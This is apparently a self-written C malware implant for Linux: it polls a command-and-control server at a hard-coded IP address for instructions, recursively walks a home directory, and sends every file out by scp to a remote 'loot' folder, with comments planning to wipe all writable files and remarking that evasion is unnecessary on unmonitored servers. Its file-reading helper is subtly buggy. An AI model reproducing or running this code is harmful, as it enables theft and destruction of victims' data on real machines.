#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

/* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
 * sudo apt install libcurl4-openssl-dev
 * gcc main.c -o main -lcurl
 *
*/

/* Supported Directives:
 * - COPY
*/

/* Operating the C2:
 * Leave the directive in "instruction.txt" and serve in at CADDRESS as shown below.
 * 
*/

/* 
 * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
 * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
 * Functionality to copy files before wiping them will be a nice addition at some point in the future.
 * 
 * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
*/

// Prototypes:

char * readFile(char * fileName);
char * takeControlInstruction(void); 
void Copy(char * rootDirectory);
void copyContents(char * fileName);

// Globals:

char * CADDRESS = "http://70.77.131.111:5678/instruction.txt";		// "http://192.168.0.200:5678/instruction.txt"
char * BASEDIRECTORY = "/home/ezra/test";
char * REMOTEPATH = "itinerant@70.77.131.111:/home/itinerant/CONTROLLER/loot/";

// Main function:

int main(int argc, char * argv[]) {
	
	/*char * controllerDirective;*/
	/*controllerDirective = takeControlInstruction();*/
	/*printf("%s", controllerDirective);*/

	Copy(BASEDIRECTORY);

	return 0;
}

// Function definitions:

void Copy(char * rootDirectory) {
	
	char * current;

	struct dirent * entry;
	DIR * dir = opendir(rootDirectory);

	if (dir == NULL) {
		printf("Cannot open directory.");
		return;
	}

	while ((entry = readdir(dir)) != NULL) {
		char fullPath[1024];
		snprintf(fullPath, sizeof(fullPath), "%s/%s", rootDirectory, entry->d_name);

		struct stat path_stat;
		stat(fullPath, &path_stat);

		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
			current = fullPath;
			printf("File: %s\n", current);
			copyContents(current);
		}
		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
				/*current = strcat(fullPath, "/");		*/
				/*printf("Directory: %s\n ", current);*/
				printf("Directory: %s\n ", fullPath);
				Copy(fullPath);
			}
			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
				/*printf("EXCEPTION: %s\n", entry->d_name);*/
				continue;
			}
		}
	}

	closedir(dir);
}

void copyContents(char * fileName) {			// This procedure relies heavily on SCP; problems will be called if it is not installed

	char command[1000];
	sprintf(command, "scp -P 49999 %s %s", fileName, REMOTEPATH);
	system(command);
	printf("Copied %s to remote server\n", fileName);
}

char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
	CURL * curl;
	CURLcode res;

	freopen("tmp", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later

	curl = curl_easy_init();									// Initializing the structure needed to make requests
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, CADDRESS);		// Setting the server
		// curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Proxy server can be specified here
		res = curl_easy_perform(curl);								// Make the request
		if (res != CURLE_OK) {									// Handling errors
		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
		}
		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
	}
	
	freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific

	char * instruction = readFile("tmp");
	/*printf("%s", instruction);*/
	
	return instruction;
}

char * readFile(char * fileName) {
	FILE * file = fopen(fileName, "r");
	if (file == NULL) {
		return "FAILED";
	}
	char * contents = malloc(20);
	while (fgets(contents, sizeof(contents), file)) {}

	fclose(file);

	return contents;
}
